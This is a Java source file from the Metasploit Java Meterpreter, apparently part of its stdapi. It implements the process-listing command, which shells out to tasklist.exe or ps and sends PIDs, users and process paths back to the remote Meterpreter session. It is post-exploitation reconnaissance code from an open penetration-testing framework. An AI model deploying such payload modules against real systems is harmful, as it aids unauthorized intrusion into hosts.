package com.metasploit.meterpreter.stdapi;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

/**
 * Ported from PHP meterpreter.
 * 
 * # Works, but not very portable.  There doesn't appear to be a PHP way of
 * # getting a list of processes, so we just shell out to ps/tasklist.exe.  I need
 * # to decide what options to send to ps for portability and for information
 * # usefulness.
 */
public class stdapi_sys_process_get_processes implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		List processes = new ArrayList();
		if (File.pathSeparatorChar == ';') {
			Process proc = Runtime.getRuntime().exec(new String[] { "tasklist.exe", "/v", "/fo", "csv", "/nh" });
			BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			String line;
			while ((line = br.readLine()) != null) {
				if (line.length() == 0)
					continue;
				line = line.substring(1, line.length() - 1); // strip quotes
				List parts = new ArrayList();
				int pos;
				// Ghetto CSV parsing
				while ((pos = line.indexOf("\",\"")) != -1) {
					parts.add(line.substring(0, pos));
					line = line.substring(pos + 3);
				}
				parts.add(line);
				while (parts.size() < 7)
					parts.add("");
				processes.add(new String[] { (String) parts.get(1), (String) parts.get(6), (String) parts.get(0) });
			}
			br.close();
			proc.waitFor();
		} else {
			Process proc = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", "ps ax -w -o pid,user,cmd --no-header 2>/dev/null" });
			BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			String line;
			while ((line = br.readLine()) != null) {
				line = line.replace('\t', ' ').trim();
				String[] process = new String[3];
				for (int i = 0; i < 2; i++) {
					int pos = line.indexOf(" ");
					process[i] = line.substring(0, pos);
					line = line.substring(pos).trim();
				}
				process[2] = line;
				processes.add(process);
			}
		}
		for (int i = 0; i < processes.size(); i++) {
			String[] proc = (String[]) processes.get(i);
			TLVPacket grp = new TLVPacket();
			grp.add(TLVType.TLV_TYPE_PID, new Integer(proc[0]));
			grp.add(TLVType.TLV_TYPE_USER_NAME, proc[1]);
			String procName = proc[2];
			if (File.pathSeparatorChar != ';' && procName.indexOf(' ') != -1) {
				procName = procName.substring(0, procName.indexOf(' '));
			}
			grp.add(TLVType.TLV_TYPE_PROCESS_NAME, procName);
			grp.add(TLVType.TLV_TYPE_PROCESS_PATH, proc[2]);
			response.addOverflow(TLVType.TLV_TYPE_PROCESS_GROUP, grp);
		}
		return ERROR_SUCCESS;
	}
}
